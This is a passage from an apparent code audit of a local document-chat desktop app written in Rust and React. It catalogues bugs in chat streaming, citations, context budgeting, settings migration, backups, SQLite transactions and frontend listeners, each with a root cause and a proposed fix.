  characters, or text ending in an emoji — panics inside the command handler. The turn dies
  with no response and no terminal event, so the UI stays stuck "generating".
- **Fix:** `format!("{}...", safe_truncate(message, MAX_LEN))`. Note this also changes the
  semantics from 50 bytes to 50 characters, which is what a title wants. Add tests for CJK,
  emoji, and combining characters. **Then grep for the same pattern elsewhere** — see
  `HYG-1`, which lists 26 more clippy-flagged panic sites of this family.
- **Verify:** Unit test `generate_title("你好世界…")` (≥50 bytes) does not panic.

### CHAT-2 — Citation footnotes link to the wrong source document
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/conversation/chat/prompting.rs:158-185` and
  budgeting at `chat.rs:414-433`; consumer at `src/app/websrc/utils/citations.ts:222-230`;
  divergent list built at `chat/retrieval/source_citations.rs:11-79` and mutated at
  `chat/tool_loop.rs:263-267`
- **Root cause:** Two different lists are numbered independently. The prompt numbers KB
  context `[1..k]` over the **budgeted per-chunk** list. The UI maps `[n] → sources[n-1]` over
  a **per-document deduped, score-resorted** list, with tool/web sources appended and
  re-deduped mid-loop.
- **Failure scenario:** Any answer citing a document that contributed two or more chunks — or
  any answer produced after budget-dropping trimmed the chunk list — renders footnotes that
  open the wrong document. The user cannot trust citations, which is the core trust primitive
  of a document-chat app.
- **Fix:** Assign a stable citation id at retrieval time, carry it through prompt construction
  and the tool loop, and have the UI resolve **by id** rather than by array position. Never
  renumber after the prompt is built.
- **Verify:** Test with a document contributing 3 chunks plus a second document; assert every
  rendered footnote resolves to the document the model was actually shown.

### CHAT-3 — Context budget assumes 8192 tokens; the sidecar often runs 2048–4096
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/llm/engine/factory.rs:345-347`
  (`max_context_tokens()` hard-codes 8192) vs. actual launch flags at
  `features/llm/engine/sidecar_manager.rs:83-92,116-147`; consumers include
  `application/services/context_window_builder.rs` (75% slice) and
  `chat/retrieval/pipeline.rs:78-88` (`available_for_rag`)
- **Root cause:** The adapter reports a fixed 8192 while the sidecar is actually launched with
  4096 on CPU-only machines and 2048 when RAM < 8 GB. Every downstream budget therefore
  overshoots the real window by 2–4×.
- **Failure scenario:** On a CPU-only or low-RAM machine, a moderately long conversation
  builds a prompt that llama-server must truncate server-side — the system prompt and the
  oldest history silently vanish (so the model ignores its instructions), or generation fails
  outright. Hardest class of bug to report, because it only manifests on smaller machines.
- **Fix:** Have `SidecarPortAdapter::max_context_tokens()` return the value the manager
  actually launched with (plumb the resolved `n_ctx` out of `SidecarHandle`). Add an assertion
  or startup log line comparing reported vs. launched context.

### CHAT-4 — `useQueryRewrite` invokes a command name that cannot exist
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/websrc/components/QueryRewritePanel/hooks/useQueryRewrite.ts:109`
- **Root cause:** Calls `invoke('ask_question_stream', …)` — a root-level command name. Every
  command in this app is an inlined plugin (`main.rs` registers no root handler), so the only
  working name is `plugin:qa|ask_question_stream_wrapper`. `api.ts:231` routes correctly; this
  hook bypasses `api.ts` and hand-rolls the invoke.
- **Failure scenario:** Any mount of `QueryRewritePanel` fails instantly with "command not
  found". The panel currently has no importers, so this is broken dead code — but it is a trap
  for whoever wires the panel up.
- **Fix:** Route through `api.ts`. Better: make `invoke` unreachable outside `lib/api.ts` via
  a lint rule, so the plugin-prefix convention cannot be bypassed again.

### CHAT-5 — Overlapping turns break cancellation permanently
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/conversation/chat/cancellation.rs:26-41`;
  guard lifecycle at `chat.rs:85-102`, `:327`; missing frontend guard at
  `websrc/stores/conversationsStore.ts:757`
- **Root cause:** The registry is keyed per conversation. A second `begin_turn` for the same
  conversation clears a pending cancel for the first turn, and whichever turn's
  `TurnCancellationGuard` drops first **removes the shared entry** — leaving the still-running
  turn with no registry entry, so `request_cancel` returns false and the cancel command
  reports `"idle"`.
- **Failure scenario:** Overlapping turns (store-level `sendMessage` has no `isSending` guard —
  only `ChatPanel` does, so any non-ChatPanel caller or a double-submit path gets here) leave
  a generation that cannot be stopped. Combined with `FE-10`, the Stop button becomes
  unreliable in exactly the situation a user most wants it.
- **Fix:** Key the registry by **turn/request id**, not conversation id, and have the cancel
  command target the active turn id. Move the in-flight guard into the store so all callers
  are covered.

### CHAT-6 — Sidecar stream parser corrupts multibyte characters and drops the final frame
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/llm/engine/sidecar_client.rs:288-354`
  (decode at `:313`); compare `ollama_client.rs:1516` and its correct tail handling at
  `:1581-1602`
- **Root cause:** Two defects:
  1. `String::from_utf8_lossy(&chunk)` decodes **each network chunk independently**, so any
     multibyte UTF-8 character split across a chunk boundary becomes `U+FFFD`.
  2. When the server closes without `data: [DONE]`, a final frame still sitting in `buffer`
     without a trailing `\n\n` is silently discarded.
- **Failure scenario:** Non-English replies get replacement characters sprinkled through them
  at random chunk boundaries, and the last few tokens of a reply can vanish. The ollama client
  handles case 2 correctly; the sidecar client (the default path) does not.
- **Fix:** Accumulate raw bytes and decode incrementally (`std::str::from_utf8` on the
  buffer, keeping any trailing partial sequence), and flush a non-empty residual buffer on
  clean EOF. Port the tail handling from `ollama_client.rs:1581-1602`.
- **Verify:** Test streaming CJK text split at deliberately awkward byte offsets, plus a
  stream that ends without `[DONE]`.

### CHAT-7 — Conversation summarization is dead wiring that still burns LLM cycles
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/conversation/chat.rs:948` (never calls
  `.with_summarization(...)`); `application/services/context_window_builder.rs:198-223`
  (`load_valid_summary` unreachable); producer still active at `chat.rs:1016-1087`
- **Root cause:** The chat path never enables summarization, so `build()` always takes
  `build_without_summary` — yet `trigger_background_summary_refresh_if_needed` keeps
  dispatching summarization jobs to the saga on long turns.
- **Failure scenario:** Long conversations silently truncate their oldest turns (the user
  perceives the assistant "forgetting") while the app spends real local-inference cycles
  generating summaries nothing ever reads. On a shared local model, that also slows the
  foreground turn.
- **Fix:** Either wire `.with_summarization(...)` into the chat builder so the summaries are
  used, or stop producing them. Do not leave it half-connected. If wiring it up, verify
  against `CHAT-3` — the budget must be correct first, or summarization triggers at the wrong
  threshold. Related leak: `CONC-6`.

### CHAT-8 — Seven "conversation thread" API functions have no backend at all
- **Severity:** P1 · **Verified:** READ + RUN (the type half fails `tsc`; see `BLD-7`)
- **Location:** `src/app/websrc/lib/api.ts:268,277-282,2667-2695,2859-2876`
- **Root cause:** `VaultAPI` exports `create/list/update/archive/delete_conversation_thread`,
  `move_conversation_to_thread`, and `add_conversation_linked_document`. **None of these
  commands exist anywhere in the Rust backend.** All three invoke fallbacks fail with "command
  not found". The corresponding TS types are also missing, which is why `tsc` reports 8 errors
  here (`BLD-7`).
- **Failure scenario:** No current UI callers, so nothing breaks today — but these are
  exported functions with plausible names and zero compile-time signal beyond the type errors.
  The next person to build a threads UI wires up seven functions that cannot work.
- **Fix:** Delete the phantom surface (preferred — it also clears 8 of the 18 `tsc` errors), or
  implement the commands end-to-end through all four registration points. Do not leave it.

### CHAT-9 — `llm-stream` is an unscoped global channel shared by two producers
- **Severity:** P1 · **Verified:** READ (found independently by the frontend audit — see `FE-2`)
- **Location:** emitters `features/conversation/chat/tool_loop.rs:126-138,147,356-374`
  (`{content, done}`) and `features/qa/engine/types.rs:63` via `features/qa/commands.rs:139`
  (`{type: "token", content}`); consumer `websrc/stores/conversationsStore.ts:830`
- **Root cause:** The event carries **no conversation or request id**, and two producers emit
  **different payload shapes** on the same channel. The store listener filters nothing and
  accepts anything with truthy `content`.
- **Failure scenario:** Any second concurrent emitter interleaves tokens into the wrong chat
  bubble. Today this is partially masked by the global `isSending` gate and QA's dead callers,
  but `FE-2` documents a live path (QueryRewritePanel generating during a chat turn). Also,
  all tool-loop error paths return **without a terminal `done` event**, so only the invoke
  rejection rescues the UI from a stuck "generating" state.
- **Fix:** Include `conversation_id` and `request_id` in every emit; have each consumer filter
  on its own id. Unify the payload shape (one `StreamChunk` type, generated for TS rather than
  hand-written). Guarantee a terminal event on every exit path — a scope guard on the Rust
  side is the robust form.

### CHAT-10 — Retrieval and verification code is dense with potential-panic indexing
- **Severity:** P1 · **Verified:** RUN (clippy, deny-level) · see `HYG-1` for the full list
- **Location:** heavy concentration in `chat/verification.rs` (8 sites),
  `chat/retrieval/` (5 sites), `qa/use_cases/ask_question.rs:739`
- **Root cause:** Direct slice/string indexing on data derived from model output and
  retrieved documents.
- **Fix:** See `HYG-1` — these are individually small but sit on the hot path for
  attacker-influenceable input (document content, model output), so they belong above
  ordinary hygiene work.

**Verified clean in this subsystem:** the tool loop has a hard 5-iteration cap with a terminal
event on exhaustion; failed turns correctly mark the pending user message `failed`
(`chat.rs:664`); the cancel-only path correctly bypasses rate limiting; `ContextWindowBuilder`
message ordering is chronologically correct with newest-first truncation; and qa/mentions/web
command handlers contain no `unwrap()`/`expect()` on user-controllable data outside tests.

---

## 8. Settings, vault, and backup

The P0 items in this subsystem (`DATA-3` through `DATA-6`, `DATA-8`, `DATA-9`) are in
Section 3. What follows is the remainder.

### SET-1 — External vault edits silently overwrite in-app edits, and re-import forever
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/vault/watcher.rs:308-343` (`import_one`);
  divergence check at `:535-556` (`is_disk_newer_than_sql`)
- **Root cause:** Two related defects:
  1. `import_one` upserts **unconditionally** — no conflict resolution. A debounced (800 ms+)
     external filesystem event that lands after an in-app edit overwrites the newer DB content
     with older file content. Because import does not write back to disk, the user's in-app
     edit is simply gone, with no conflict marker and no notification.
  2. Import stores the file's **frontmatter** `updated_at`. External editors change the body
     without touching frontmatter, so the DB gets a stale `updated_at` while the file's mtime
     is now. `is_disk_newer_than_sql` is therefore true on every subsequent focus → the note
     re-imports, emits `vault:note-imported`, and triggers a frontend refetch, **forever**.
- **Failure scenario:** User edits a note in Lattice; Obsidian's sync writes the older version
  a second later; the Lattice edit vanishes. Separately, any externally-edited note causes a
  permanent re-import loop on every window focus (visible as constant refetch churn).
- **Fix:** (1) Compare timestamps before importing and, on conflict, keep both — write a
  `.conflict` sibling file or surface a merge prompt; never silently drop the newer side.
  (2) Derive `updated_at` from the file's mtime, not its frontmatter, when the body has changed.
  Add a content hash to make "did this actually change?" cheap and reliable.
- **Verify:** Test: in-app edit then a stale external event → in-app content survives.
  Test: external body-only edit → exactly one import, then stable across repeated focus.

### SET-2 — Legacy `config.json` migration misreads a missing field as "disabled"
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/settings/repository.rs:229-235`
- **Root cause:** `LegacyAppConfig` is `#[serde(default)]`, so a legacy `config.json` that
  simply **omits** `auto_index` deserializes it to `false`; the migration then writes
  `auto_index_new_files = false`, overriding the new default of `true`.
- **Failure scenario:** An upgrading user who never touched auto-indexing silently gets it
  turned off. New files stop being indexed and there is no signal explaining why.
- **Fix:** Make the legacy field `Option<bool>` and only carry it over when
  `Some`. Audit the other migrated fields for the same "absent means false" trap.

### SET-3 — Settings import in merge mode silently drops the `vault` category
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/settings/repository.rs:1215-1228`
- **Root cause:** The merge branch copies indexing/search/llm/ui/sync/backup/privacy but
  **not** `settings.vault` (the replace branch does include it).
- **Failure scenario:** User exports settings, merge-imports them on another machine, and gets
  a "success" result with vault enablement and vault path missing — potentially leaving the
  machine mirroring to the wrong vault root, which then interacts with the destructive
  ghost-sweep in `DATA-6`.
- **Fix:** Add `vault` to the merge branch. Better: derive the merge from a field list or a
  macro so a new category cannot be forgotten — this is the third bug in this file caused by
  hand-maintained per-category code.

### SET-4 — A configured custom `backup_path` makes every automatic backup fail forever
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/backup/adapter.rs:385-394` (rejects) vs.
  `features/backup/scheduler.rs:71-76` (passes it through) vs.
  `features/settings/repository.rs:993-998` (**requires** it)
- **Root cause:** Three components disagree about the same setting. Settings validation
  *requires* `backup_path` when auto-backup is enabled; the scheduler forwards it; and
  `create_backup` **hard-rejects** any path outside `<db_dir>/backups` via
  `canonical_path.starts_with(canonical_backup_root)`.
- **Failure scenario:** User enables automatic backups and points them at `~/Backups` — which
  the settings UI accepts. Every scheduled tick fails with `PermissionDenied`, logged only.
  The user believes they have backups and has none. This is the worst kind of failure: silent,
  and only discovered when a restore is needed.
- **Fix:** Decide the policy and enforce it in one place. Either honor user-chosen paths
  (validated for writability and not inside the app's own data dir) or refuse them at the
  settings layer with a clear UI error. Additionally, surface repeated backup failures to the
  user — a scheduled job that fails every tick must not be log-only.
- **Verify:** Configure a custom path; assert a backup file actually appears, or that the
  settings save is rejected with a visible message.

### SET-5 — Vault frontmatter `tags` are write-only decoration (three-way dead end)
- **Severity:** P2 · **Verified:** READ
- **Location:** every writeback call site passes `Vec::new()`
  (`features/daily_notes/commands.rs:263,316,559`); backfill hard-codes empty tags
  (`features/vault/writeback.rs:216-218`); `import_one` ignores `parsed.tags` entirely
  (`features/vault/watcher.rs:308-326`) — even though `parse.rs` round-trips them correctly
- **Failure scenario:** A user who adds tags to a note in Obsidian has them silently discarded
  the next time Lattice writes that note. The parse support existing but being unused makes
  this look intentional to a reader.
- **Fix:** Thread real tags through writeback and honor `parsed.tags` on import, joining with
  the `tags` feature's existing storage. If tags are genuinely out of scope for the vault
  bridge, delete the parse support and document the omission.

### SET-6 — `daily_notes` has no repository; two modules write one table with different semantics
- **Severity:** P2 (architectural; root cause of `DATA-3`) · **Verified:** READ
- **Location:** `src/app/src/src/features/daily_notes/commands.rs` and
  `features/vault/watcher.rs` both issue raw SQL against `daily_notes_workspace`
- **Root cause:** Exactly the two-writers-one-entity pattern the Repository Barrier rule
  exists to prevent — and the grep guard misses it because neither file lives under
  `use_cases/`. The two writers use different `updated_at` semantics, which is what makes
  `SET-1`'s re-import loop possible.
- **Fix:** Introduce `DailyNotesRepository` as the single owner of that table and route both
  modules through it. Extend `scripts/check-repository-barrier.sh` to also flag raw SQL in
  `commands.rs` and `watcher.rs`-style modules, not just `use_cases/`. See `ARCH-1`.

**Verified clean in this subsystem:** `bash scripts/check-repository-barrier.sh` passes, and no
`use_cases/` filesystem-state decisions were found in scope (backup's filesystem use is in the
adapter, which is the correct layer; `file/use_cases/*` route through the `file_storage` port).
Single-writer settings crash-safety is correct (temp + `sync_all` + rename), as is the vault
`atomic_write` (unique UUID temp names — the pattern `DATA-5` should adopt). The `config.json`
migration ordering is right (durable write, then delete legacy, non-fatal on failure). The
watcher's own-write suppression, id-vs-stem check, and atomic-save `NotFound` grace window are
soundly implemented.

---

## 9. Database, SQL, and migrations

### SQL-1 — Re-index upsert id mismatch
> Same defect as `IDX-1`, found independently and **confirmed empirically against SQLite
> 3.51**. See `IDX-1`.

### SQL-2 — Unescaped `LIKE` prefix delete
> Same defect as `DATA-2`. See `DATA-2`.

### SQL-3 — `delete_messages` ignores conversation scope and is not transactional
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/conversation/repository.rs:140-192`
- **Root cause:** Two defects. (1) The delete is `WHERE id IN (...)` with **no
  `conversation_id` predicate**, so ids belonging to another conversation are deleted and that
  conversation's `message_count` / `total_tokens` are never recounted. (2) The DELETE, the
  recount, and the counts UPDATE are three separate pool executions with **no transaction**.
- **Failure scenario:** A concurrent `add_message` interleaving between the recount and the
  UPDATE — or any failure mid-sequence — leaves `message_count` and `total_tokens` permanently
  wrong, which then feeds context-budget decisions (`CHAT-3`).
- **Fix:** Add `AND conversation_id = ?` to the delete, and wrap all three statements in one
  transaction.

### SQL-4 — Mentions write on a second connection inside an open write transaction (guaranteed stall)
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/indexing/engine/storage/chunks.rs:152-164`;
  reachable via `features/indexing/engine/storage/mod.rs:70,194`
- **Root cause:** Inside an open write transaction, the code constructs
  `MentionRepository::new(pool.clone())` and writes through it — i.e. on a **different pooled
  connection** — while the outer transaction still holds SQLite's single writer lock. The
  `clear_document_mentions` DELETE runs unconditionally.
- **Failure scenario:** Every indexed document incurs a full 5-second `busy_timeout` stall,
  then `SQLITE_BUSY`, and the mentions are dropped via a `tracing::warn` that nobody reads.
  Indexing a 500-file folder becomes ~42 minutes of pure lock waiting, and mention data is
  silently absent.
- **Fix:** Pass the existing `&mut Transaction` into the mention writes (add a
  transaction-taking method on `MentionRepository`), or defer mention writes until after the
  outer transaction commits. **Never open a second connection inside a write transaction on
  SQLite.**
- **Verify:** Time indexing of a multi-file folder before and after; assert mentions are
  actually persisted.

### SQL-5 — Indexing rollback deletes by the wrong id domain
> Same defect as `IDX-12`. See `IDX-12`.

### SQL-6 — Three divergent schema definitions; the sqlx cache can be prepared from a stale one
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/init_schema.sql` vs.
  `src/app/src/migrations/20250101000000_init_schema.sql` vs.
  `src/app/src/src/infrastructure/persistence/database/schema.sql`; bad instruction in
  `scripts/update-sqlx-cache.sh`
- **Root cause:** Three files describe the schema. Runtime uses only
  `sqlx::migrate!("./migrations")`. The root `init_schema.sql` is **stale** — it declares
  version 15 and is missing `models`, `model_files`, `download_sessions`,
  `conversation_summaries`, `conversation_memory_vectors`, and
  `conversation_messages.status`. `scripts/update-sqlx-cache.sh` instructs building
  `sqlx_prepare.db` **from that stale file**, so the offline `.sqlx` cache can be prepared
  against a schema that does not match production.
- **Failure scenario:** A developer regenerates the sqlx cache per the script, and compile-time
  query verification now validates against a schema the app never uses — either failing on
  valid queries or, worse, accepting queries that will fail at runtime. This is a direct
  violation of the project's own SSOT rule, applied to the schema itself.
- **Fix:** Delete `src/app/src/init_schema.sql` and
  `infrastructure/persistence/database/schema.sql`, or generate them from the migrations as
  build artifacts. Rewrite `scripts/update-sqlx-cache.sh` to run the migration chain against a
  temporary database. **Do this before any work that requires regenerating the cache** — see
  ground rule 1 and `IDX-1`.

### SQL-7 — Watch-folder removal is two un-transacted deletes
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/file/commands.rs:408-430`
- **Root cause:** `DELETE FROM watch_folders` and `DELETE FROM documents` are separate pool
  executions with no transaction.
- **Failure scenario:** A failure between them un-watches the folder while leaving its
  documents — and their chunks, embeddings, and FTS rows — permanently orphaned in the index,
  with no folder entry to re-derive them from.
- **Fix:** One transaction. Fix alongside `DATA-2`, which is in the same function.

### SQL-8 — `batch_insert_*` helpers issue `BEGIN IMMEDIATE` inside an existing transaction
- **Severity:** P2 (dead code today) · **Verified:** READ
- **Location:** `src/app/src/src/infrastructure/persistence/database/utils.rs:57-60,88-90`
- **Root cause:** `batch_insert_chunks` / `batch_insert_embeddings` execute `BEGIN IMMEDIATE`
  while already inside a `pool.begin()` transaction → "cannot start a transaction within a
  transaction". 100% failure rate if ever called.
- **Failure scenario:** No callers today. A landmine for anyone who reaches for these helpers
  to optimize the indexing path.
- **Fix:** Delete them, or make them take `&mut Transaction` and not manage transactions
  themselves.

### SQL-9 — `begin_immediate`'s Drop can issue an unmatched ROLLBACK
- **Severity:** P2 · **Verified:** READ
- **Location:** `src/app/src/src/infrastructure/persistence/database/connection.rs:150-185`
- **Root cause:** Mode-switching via the literal `"ROLLBACK; BEGIN IMMEDIATE"` inside a sqlx
  `Transaction`. If the `BEGIN IMMEDIATE` half fails (e.g. `SQLITE_BUSY`), the guard's `Drop`
  issues a ROLLBACK on a connection with **no open transaction**.
- **Failure scenario:** Mostly survivable (the error is retried), but it produces confusing
  errors under write contention, and it is used by all four `download_repository` write paths —
  which are exactly the paths already implicated in `DL-3`.
- **Fix:** Track whether the `BEGIN IMMEDIATE` succeeded and make `Drop` conditional.

### SQL-10 — Tag and mention search `LIKE` patterns don't escape user wildcards
- **Severity:** P2 · **Verified:** READ
- **Location:** `src/app/src/src/features/tags/repository.rs:671-678`;
  `features/mentions/repository.rs:266-272`
- **Root cause:** `format!("%{}%", query)` with no `ESCAPE` clause. Parameterized, so **not**
  an injection risk — but a user searching for `50%` or `foo_bar` gets wrong results.
- **Fix:** Escape `%`, `_`, and the escape character itself, and add `ESCAPE '\'`. Same helper
  as `DATA-2`; write it once and share it.

### SQL-11 — Timestamp formats are mixed within columns, breaking ordering
- **Severity:** P2 · **Verified:** READ
- **Location:** `documents.modified_at` / `indexed_at` are RFC3339-with-offset while
  `created_at` / `updated_at` use `CURRENT_TIMESTAMP` (space-separated, no offset);
  migrations `20260227010000:10` and `20260304000000:69` backfill
  `journal_conversation_entries.created_at` with
  `COALESCE(<rfc3339 value>, CURRENT_TIMESTAMP)`; consumer at
  `features/search/engine/recency.rs:123-130`
- **Root cause:** That `COALESCE` puts **both formats in one column**. Since `'2026-07-29T…'`
  and `'2026-07-29 …'` sort differently as text, `ORDER BY created_at` misorders same-day rows.
  `recency.rs:123-130` silently drops any timestamp carrying an offset (`if let Ok`), which
  works today only because `updated_at` happens never to be RFC3339 — a drift trap waiting for
  someone to "fix" the writer.
- **Fix:** Pick one canonical format (RFC3339 UTC is the better choice), write a migration
  that normalizes existing rows, and centralize timestamp formatting in one helper. Make
  `recency.rs` log rather than silently skip unparseable values.

**Verified clean in this subsystem:** **No SQL injection anywhere** — no `format!`-interpolated
user input reaches SQL, and all dynamic `IN (...)` clauses use bound placeholders
(`chunk/ops.rs:332`, `document/ops.rs:788`, the conversation repo). FTS trigger coverage for
`chunks_fts` and `conversation_search_fts` is complete across insert/update/delete including
title-only updates, and it was **confirmed empirically that FK cascade deletes do fire
`AFTER DELETE` triggers**, so cascades do not orphan FTS rows. Migration versioning is
sequentially sound; `space_general` cannot be deleted or archived (`plugin_impl.rs:1476`), so
the `20260304*` repair migrations cannot abort; the synthetic Ollama row is `INSERT OR IGNORE`
idempotent; and the `20260501` `storage_kind`/`storage_path` backfill correctly handles orphans
via the `__missing_after_migration__` sentinel and backfills `total_size_bytes` before dropping
the CTE. Pool config is appropriate for desktop SQLite: WAL, `busy_timeout(5s)`,
`synchronous=NORMAL`, max 5 connections, FK enforcement (`connection.rs:60-77`), and embeddings
are computed **before** transactions open, so the happy path holds no long write locks.

---

## 10. React frontend

### FE-1 — Progress listeners re-subscribe on every render and leak on an await race
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/websrc/hooks/useProgressListener.ts:35-158`;
  caller `websrc/components/Progress/ProgressProvider.tsx:22`
- **Root cause:** Two compounding defects. (1) The effect's dependency array includes `types`,
  but `ProgressProvider` passes an **inline array literal** (and the hook's own default
  parameter constructs a new array per render), so the effect tears down and re-subscribes all
  **15** Tauri listeners on every render. (2) Cleanup iterates `unlisteners` immediately, while
  an `await listenValidated(...)` may still be in flight; when that promise resolves it pushes
  into the already-drained array, and **that listener is never unlistened**.
- **Failure scenario:** Ordinary UI activity accumulates orphaned progress listeners for the
  app's lifetime. Meanwhile `operationMapRef` is cleared on each effect re-run — mid-operation —
  so a single backend operation spawns duplicate progress cards.
- **Fix:** Hoist `types` to a module-level constant (or `useMemo` it) so the deps are stable,
  and use the `isMounted`-then-`handle()` pattern already used correctly in
  `useVaultWriteErrorListener.ts`, `useVaultImportListener.ts`, `useModelWarmupListener.ts`,
  `useVaultFocusRescan.ts`, and `useDownloads.ts`. Do not clear `operationMapRef` on re-subscribe.

### FE-2 — `llm-stream` consumer accepts foreign payloads (cross-feature token bleed)
- **Severity:** P1 · **Verified:** READ · backend half is `CHAT-9`
- **Location:** `src/app/websrc/stores/conversationsStore.ts:830-874`
- **Root cause:** The chat listener filters nothing, and the backend has two producers on the
  same event with incompatible shapes (see `CHAT-9`). Both shapes have truthy `content`.
- **Failure scenario:** If `QueryRewritePanel` generates while a chat turn streams, rewrite
  tokens are appended into the chat's optimistic assistant bubble — and chat tokens land in
  `useQueryRewrite`'s `streamingResponse`. Separately, on cancel-then-resend the old send's
  listener stays registered until its `chatWithConversation` promise rejects, so the new
  generation's chunks are briefly appended to **two** assistant bubbles.
- **Fix:** Filter on `conversation_id` + `request_id` once the backend emits them (`CHAT-9`),
  and unregister the previous listener synchronously on resend.

### FE-3 — Early return leaks the stream listener and orphans optimistic messages
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/websrc/stores/conversationsStore.ts:966-971`
- **Root cause:** When the response lacks a conversation id, the function returns **before**
  `unlistenFn()` (line 990) and before deleting `tempId` / `assistantTempId` (lines 985-987).
- **Failure scenario:** A zombie global `llm-stream` listener survives forever and appends
  **every future generation's** tokens into the still-rendered orphaned assistant bubble —
  visibly duplicated streaming text, plus a permanently "pending" user message. Reachable on a
  malformed success response.
- **Fix:** Use `try/finally` so cleanup cannot be skipped by any return path.

### FE-4 — `useDownloadedModels` registers its completion listener once per consumer
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/websrc/hooks/useDownloadedModels.ts:210-287`; mounted in
  `App.tsx:53`, `ChatView.tsx:13`, `ModelDetailPanel.tsx:50`, `ChatTab.tsx:33`,
  `ModelRolesContext.tsx:56`, and **per card** in `LocalModelCard.tsx:51`
- **Root cause:** The hook registers a `model-download-completed` listener in every consumer.
  With a catalog of N cards rendered, one event fires N duplicate `toast.success` calls and N
  concurrent `fetchDownloadedModels()`, each of which does `clearDownloadedModels()` and then
  repopulates.
- **Failure scenario:** A download completes; the user sees a stack of identical toasts, and
  because `activeModel` transiently nulls during each clear/repopulate cycle, the composer
  (`ChatPanel.tsx:418`) flickers into a disabled "AI is downloading…" state. Note
  `useDownloadsListener` has a comment at `App.tsx:42` explicitly forbidding exactly this
  pattern.
- **Fix:** Move the listener to a single app-level mount (as `useDownloadsListener` does) and
  have the hook read from the store. Better: migrate to React Query and invalidate on the
  event — see `ARCH-2`.

### FE-5 — Chat auto-scroll fires on every render, hijacking the scroll position
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/websrc/components/Chat/ChatPanel.tsx:191-203`;
  `websrc/stores/conversationsStore.ts:1238-1252`
- **Root cause:** `getConversationMessages()` constructs a **fresh array on every call**
  (line 1251) and that array is in the scroll effect's dependency list, so the effect runs
  after every `ChatPanel` render — including on each keystroke via `setInput`.
- **Failure scenario:** A user scrolls up to re-read earlier context, starts typing a
  follow-up, and is smooth-scroll-yanked to the bottom on the first keystroke.
- **Fix:** Memoize the selector (or select a stable reference / length+id signature), and gate
  auto-scroll on "user is already near the bottom".

### FE-6 — `useIndexProgress` leaks up to 4 listeners per effect run
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/websrc/hooks/useIndexProgress.ts:67-145`; caller
  `websrc/components/.../IndexProgress.tsx:49-53`
- **Root cause:** Four `await listen(...)` calls with **no `isMounted` guard**; cleanup reads
  local variables that are still `null` while setup awaits, so the resolved unlisten functions
  are never invoked. Dependencies are the caller's raw `onComplete`/`onError`/`onCancel` props,
  which `IndexProgress.tsx` forwards unmemoized — so the effect re-runs every render.
- **Failure scenario:** Each re-run leaks up to 4 indexing listeners, which keep calling
  `setProgress` on an unmounted component (React warns, and stale progress can overwrite live
  progress).
- **Fix:** Same `isMounted`-then-`handle()` pattern as `FE-1`; wrap the callbacks in
  `useCallback` at the call site or store them in a ref so they are not dependencies.

### FE-7 — `useQueryRewrite` has the same await-race leak plus a permanent schema mismatch
- **Severity:** P2 · **Verified:** READ
- **Location:** `src/app/websrc/components/QueryRewritePanel/hooks/useQueryRewrite.ts:122-171`
- **Root cause:** If cleanup runs before `listenValidated` resolves, `unlistenFn` is assigned
  afterward and never called (the `cancelled` flag suppresses handlers but not the
  registration). Additionally its zod schema (`EventSchemas.LLM.StreamChunk`, a tagged union)
  **rejects** the tool-loop chat payload `{content, done}`, so while the panel is mounted every
  chat token triggers the validation-error callback — console spam at token rate.
- **Fix:** Fix the leak as in `FE-1`; resolve the schema split as part of `CHAT-9`. Note this
  hook is also broken outright per `CHAT-4`.

### FE-8 — Stop button can target the wrong conversation, leaving generation unstoppable
- **Severity:** P1 · **Verified:** READ · backend half is `CHAT-5`
- **Location:** `src/app/websrc/components/Chat/ChatPanel.tsx:397-400` plus the store-wide
  `isSending` flag
- **Root cause:** `isSending` is a single global flag, and `handleCancel` calls
  `cancelGeneration(activeConversationId)`.
- **Failure scenario:** User starts a generation, switches conversations, then clicks Stop. The
  cancel targets the **new** conversation, which has no generation. The real generation keeps
  running with no way to stop it, and because `isSending` is global the composer stays disabled
  **everywhere** until it finishes.
- **Fix:** Track in-flight generations per conversation (a map keyed by conversation id, ideally
  holding the backend turn id from `CHAT-5`) and have Stop target the generation it belongs to.

### FE-9 — `toolPreferences` persisted in localStorage while the backend also owns them
- **Severity:** P2 · **Verified:** READ
- **Location:** `src/app/websrc/components/Chat/ChatPanel.tsx:76-117,212-219`; backend copy at
  `space.toolPreferencesJson`, applied at `:221-285` via a last-writer-wins ref dance
- **Root cause:** Two persistence layers for one entity. The backend acts on these every turn
  (`sendMessage(..., effectiveToolPreferences)`), and per-space preferences also live
  backend-side.
- **Failure scenario:** A space's preferences overwrite the user's localStorage preferences,
  but only once per conversation switch — so the effective value depends on navigation order.
  Classic drift; also a direct violation of `CLAUDE.md` rule 3.
- **Fix:** Make the backend the SSOT; read with `useQuery`, write with `useMutation`. Delete
  the localStorage copy.

### FE-10 — Uncancelled `setTimeout` retry chain after unmount
- **Severity:** P3 · **Verified:** READ
- **Location:** `src/app/websrc/components/Chat/ChatView.tsx:87-113`
- **Root cause:** Up to 16 chained 120 ms timeouts with no cleanup; they keep firing after
  unmount/navigation, calling `getElementById` and toggling classes on a document that no
  longer contains the target. Bounded to ~2 s, hence P3.
- **Fix:** Track the timeout id in a ref and clear it in the effect cleanup.

### FE-11 — Polling interval recreated on every tick
- **Severity:** P3 · **Verified:** READ
- **Location:** `src/app/websrc/components/Ingest/ImportHistory.tsx:85-97`
- **Root cause:** The effect depends on `jobs`, and each 2 s poll calls `setJobs` with a fresh
  array, so the interval is cleared and recreated every cycle.
